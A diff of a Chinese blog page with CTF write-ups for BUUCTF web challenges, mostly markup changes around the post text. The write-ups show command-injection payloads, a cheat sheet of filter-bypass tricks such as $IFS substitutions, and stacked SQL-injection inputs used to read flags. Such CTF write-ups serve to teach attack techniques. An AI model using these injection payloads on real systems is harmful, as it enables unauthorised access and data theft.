@@ -217,7 +217,7 @@ mjx-container[display="true"] + br {
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-contact"><a href="/contact/" rel="section"><i class="fa fa-envelope fa-fw"></i>Contact</a></li><li class="menu-item menu-item-常驻更新博客目录"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>常驻更新博客目录</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-contact"><a href="/contact/" rel="section"><i class="fa fa-envelope fa-fw"></i>Contact</a></li><li class="menu-item menu-item-常驻更新博客目录"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>常驻更新博客目录</a></li><li class="menu-item menu-item-友链"><a href="/youlian/" rel="section"><i class="fa fa-calendar fa-fw"></i>友链</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
@@ -268,7 +268,7 @@ mjx-container[display="true"] + br {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec"><span class="nav-number">1.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gxyctf2019ping-ping-ping"><span class="nav-number">2.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#suctf-2019easysql"><span class="nav-number">3.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">4.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="nav-number">1.</span> <span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">2.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">3.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">4.</span> <span class="nav-text">[强网杯 2019]随便注</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -281,7 +281,7 @@ mjx-container[display="true"] + br {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -370,49 +370,44 @@ mjx-container[display="true"] + br {
     
     
     
-    <div class="post-body" itemprop="articleBody"><h3 id="actf2020-新生赛exec">[ACTF2020 新生赛]Exec</h3>
-<span id="more"></span>
+    <div class="post-body" itemprop="articleBody"><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><span id="more"></span>
 <p>输入<code>127.0.0.1;ls</code></p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141656487.png"></p>
-<p>发现真的把
-<code>index.php</code>（也就是<code>ls</code>的操作结果）真的输出了，说明没有过滤分号</p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141656487.png" alt></p>
+<p>发现真的把 <code>index.php</code>（也就是<code>ls</code>的操作结果）真的输出了，说明没有过滤分号</p>
 <p>最终在<code>127.0.0.1;cd ../../../;ls</code>找到了flag文件</p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141854210.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141854210.png" alt></p>
 <p>输入<code>127.0.0.1;cd ../../../;ls</code>得到flag</p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141948311.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816141948311.png" alt></p>
 <p>flag:<code>flag{4e3b851f-9a72-42c9-a57a-d6698548cdc0}</code></p>
-<h3 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h3>
-<p>发现有一个<code>/?ip=</code></p>
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>发现有一个<code>/?ip=</code></p>
 <p>根据上一题的经验，我们输入<code>/?ip=127.0.0.1;ls</code>，得到</p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816165534905.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816165534905.png" alt></p>
 <p>得知不能输入空格</p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816165620729.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816165620729.png" alt></p>
 <p>所以我们需要绕过空格使用一下平替</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">${IFS}$9</span><br><span class="line">{IFS}</span><br><span class="line">$IFS</span><br><span class="line">${IFS}</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>
 <p>输入<code>/?ip=127.0.0.1;cat$IFS1flag.php</code></p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816170242335.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816170242335.png" alt></p>
 <p>我们查看index.php</p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816171040850.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816171040850.png" alt></p>
 <p>使用 <code>/?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php</code></p>
 <p>F12即可得到flag</p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816171951521.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240816171951521.png" alt></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line">---</span><br><span class="line">ps:有时会禁用cat:</span><br><span class="line">解决方法是使用tac反向输出命令：</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br><span class="line">---</span><br><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line">这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用</span><br></pre></td></tr></table></figure>
 <p>flag:<code>flag{ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1}</code></p>
-<h3 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h3>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829192738522.png"></p>
+<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829192738522.png" alt></p>
 <p>堆叠注入查询数据库</p>
 <p><code>1; show databases;</code></p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829192900891.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829192900891.png" alt></p>
 <p>查询表名</p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829192936164.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829192936164.png" alt></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show columns from Flag;#</span><br><span class="line">select $_GET['query'] || flag from flag</span><br></pre></td></tr></table></figure>
 <p>尝试访问Flag，发现不行</p>
 <p>输入<code>*,1</code></p>
-<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829193113322.png"></p>
+<p><img src="/2024/08/16/BUUCTF-Web-wp/image-20240829193113322.png" alt></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这里的原理是</span><br><span class="line"></span><br><span class="line">sql=select.post[‘query’]."||flag from Flag";</span><br><span class="line">如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，</span><br><span class="line">就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。</span><br><span class="line"></span><br><span class="line">这里说一下我的理解</span><br><span class="line"></span><br><span class="line">这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。</span><br><span class="line"></span><br><span class="line">当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。</span><br></pre></td></tr></table></figure>
 <p>flag:<code>flag{70066add-3cd0-49ec-84b3-8e6ee05c3dd9}</code></p>
-<h3 id="强网杯-2019随便注">[强网杯 2019]随便注</h3>
-
+<h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3>
     </div>
 
     
